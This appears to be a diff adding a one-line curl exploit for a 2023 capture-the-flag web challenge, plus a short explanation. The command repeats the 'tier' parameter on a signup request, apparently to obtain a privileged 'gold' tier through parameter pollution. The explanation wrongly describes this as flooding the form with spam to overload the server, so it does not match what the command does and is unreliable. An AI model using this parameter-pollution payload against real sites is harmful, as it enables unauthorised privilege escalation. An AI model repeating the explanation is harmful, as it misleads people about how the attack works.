@@ -1,0 +1,5 @@
+curl -X POST -d "username=nj120903&password=123456789&tier=red&tier=blue&tier=green&tier=gold" https://under-construction-web.2023.ctfcompetition.com/signup
+
+
+EXPLANATION -- 
+In the context of web pollution, this command could be used in a malicious way to flood the signup form of the specified website with fake or spammy data. This could potentially overload the server, consume its resources, and disrupt its normal operation. It's important to use such tools responsibly and only for legitimate purposes.
